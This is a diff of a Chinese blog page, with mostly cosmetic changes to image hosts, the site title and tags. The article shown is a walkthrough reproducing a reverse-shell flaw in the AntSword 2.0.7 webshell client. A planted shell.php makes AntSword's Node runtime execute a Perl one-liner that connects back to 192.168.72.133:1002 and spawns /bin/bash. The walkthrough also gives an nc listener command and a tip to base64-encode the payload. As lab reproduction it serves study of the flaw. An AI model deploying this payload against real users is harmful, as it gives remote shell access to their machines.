@@ -101,10 +101,10 @@
     </ul>
 </nav>
     <header class="cube-header" id="cube-header">
-    <img src=" http://cube-1252774894.cosgz.myqcloud.com/background.png " alt="头部背景图片">
+    <img src=" http://47.100.111.126/bolg/background/1.jpg " alt="头部背景图片">
     
     <div class="cube-type">
-        <span class="cube-typed-title">senrenbankaの部落格</span>
+        <span class="cube-typed-title">AVra</span>
         <span class="cube-typed-cursor">|</span>
     </div>
     
@@ -124,7 +124,7 @@
             -webkit-filter: blur(5px);
         
             z-index: -1;
-            background-image: url('http://cube-1252774894.cosgz.myqcloud.com/background.png');
+            background-image: url('http://47.100.111.126/bolg/background/1.jpg');
             background-repeat: no-repeat;
             background-position: center -356px;
             background-size: cover;
@@ -133,14 +133,14 @@
 
         header.cube-background.cube-header-background {
             visibility: hidden;
-            background-image: url('http://cube-1252774894.cosgz.myqcloud.com/background.png');
+            background-image: url('http://47.100.111.126/bolg/background/1.jpg');
             background-position: center -400px;
         }
     </style>
     <header class="cube-background cube-header-background">
         
         <div class="cube-type">
-            <span class="cube-typed-title">senrenbankaの部落格</span>
+            <span class="cube-typed-title">AVra</span>
             <span class="cube-typed-cursor">|</span>
         </div>
         
@@ -151,8 +151,8 @@
 
             window.headerModule = {}
             window.headerModule.image = {
-                width: '2000',
-                height: '1414'
+                width: '1920',
+                height: '1080'
             }
 
         })(window)
@@ -180,7 +180,7 @@
     <div class="cube-article-content cube-markdown">
         
         <p>antsword 反弹shell的复现</p>
-<p>首先下载<a href="http://155.254.48.100/bolg/antsword/AntSword-v2.0.1-linux-x64.zip" target="_blank" rel="noopener">软件</a>和<a href="http://155.254.48.100/bolg/antsword/antSword-2.0.7.zip" target="_blank" rel="noopener">源码</a>（受影响源码为2.7）</p>
+<p>首先下载<a href="http://47.100.111.126/bolg/antsword/AntSword-v2.0.1-linux-x64.zip" target="_blank" rel="noopener">软件</a>和<a href="http://47.100.111.126/bolg/antsword/antSword-2.0.7.zip" target="_blank" rel="noopener">源码</a>（受影响源码为2.7）</p>
 <p>我这里用了两台linux虚拟机复现（Ubuntu和centos7）</p>
 <p>1，先用centos7搭一个php环境，然后把shell.php丢进去</p>
 <p>​    shell.php内容为：</p>
@@ -188,24 +188,24 @@
 <p>​    此代码用的是perl的反弹shell 请自行确保你的linux中有perl</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'perl -e \'use Socket;$i="192.168.72.133";$p=1002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");&#125;;\''</span>,(error, stdout, stderr)=&gt;&#123;</span><br><span class="line">    alert(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
 <p>​    可自行替换复制用base64加密后利用</p>
-<p>我这里用的是宝塔<img src="http://155.254.48.100/bolg/antsword/5.jpg" alt></p>
+<p>我这里用的是宝塔<img src="http://47.100.111.126/bolg/antsword/5.jpg" alt></p>
 <p>​    得到shell.php地址,完成第一步</p>
 <p>​    我的地址为：<a href="http://192.168.72.133:3456/shell.php" target="_blank" rel="noopener">http://192.168.72.133:3456/shell.php</a></p>
 <p>​    </p>
 <p>2，用buntu安装蚁剑，</p>
 <p>​    首先解压并经入到AntSword-v2.0.1-linux-x64然后打开命令行，用</p>
-<p>​    <img src="http://155.254.48.100/bolg/antsword/1.jpg" alt></p>
+<p>​    <img src="http://47.100.111.126/bolg/antsword/1.jpg" alt></p>
 <p>​        $ ./Antsword  运行</p>
 <p>​        将antSword-2.0.7添加为源</p>
 <p>​        重新启动Antsword  就可以运行了</p>
-<p>​    <img src="http://155.254.48.100/bolg/antsword/2.jpg" alt></p>
+<p>​    <img src="http://47.100.111.126/bolg/antsword/2.jpg" alt></p>
 <p>​        然后将 centos7的shell路径添加进来</p>
-<p>​    <img src="http://155.254.48.100/bolg/antsword/3.jpg" alt></p>
+<p>​    <img src="http://47.100.111.126/bolg/antsword/3.jpg" alt></p>
 <p>​        双击进行连接，会促发alert事件，</p>
 <p>3，切换到centos7 </p>
 <p>​    $ nc  -l 1002  </p>
 <p>​    对1002端口进行监听就可以返回shell了</p>
-<p>​    <img src="http://155.254.48.100/bolg/antsword/4.jpg" alt></p>
+<p>​    <img src="http://47.100.111.126/bolg/antsword/4.jpg" alt></p>
 <p>​    </p>
 
     </div>
@@ -387,17 +387,17 @@
         
         
         <div class="cube-box ">
-            <a href="/tags/LINUX/">#LINUX</a>
-        </div>
-        
-        
-        <div class="cube-box ">
             <a href="/tags/KALI-freekill/">#KALI_freekill</a>
         </div>
         
         
         <div class="cube-box ">
             <a href="/tags/FLAG/">#FLAG</a>
+        </div>
+        
+        
+        <div class="cube-box-bg ">
+            <a href="/tags/LINUX/">#LINUX</a>
         </div>
         
         
@@ -421,7 +421,7 @@
         </div>
         
         
-        <div class="cube-box ">
+        <div class="cube-box-bg ">
             <a href="/tags/PYTHON/">#PYTHON</a>
         </div>
         
